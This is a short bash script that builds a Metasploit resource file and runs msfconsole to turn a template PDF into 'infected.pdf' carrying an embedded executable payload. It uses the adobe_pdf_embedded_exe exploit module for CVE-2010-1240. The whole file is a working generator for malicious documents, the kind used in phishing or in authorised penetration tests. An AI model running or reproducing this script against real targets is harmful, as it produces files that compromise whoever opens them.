#!/bin/bash


# PDF_ORIGINAL="pdf/rib_clean.pdf"
PDF_ORIGINAL="/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf"
EXE_PAYLOAD="pdf/payload.exe"
OUTPUT_NAME="pdf/output/infected.pdf"

SCRIPT_FILE="pdf/msf_generator.rc"

echo "use exploit/windows/fileformat/adobe_pdf_embedded_exe" > $SCRIPT_FILE
echo "set FILENAME $OUTPUT_NAME" >> $SCRIPT_FILE
echo "set INFILENAME $PDF_ORIGINAL" >> $SCRIPT_FILE
echo "set EXE::CUSTOM $EXE_PAYLOAD" >> $SCRIPT_FILE
echo "exploit" >> $SCRIPT_FILE
echo "exit" >> $SCRIPT_FILE

msfconsole -q -r $SCRIPT_FILE
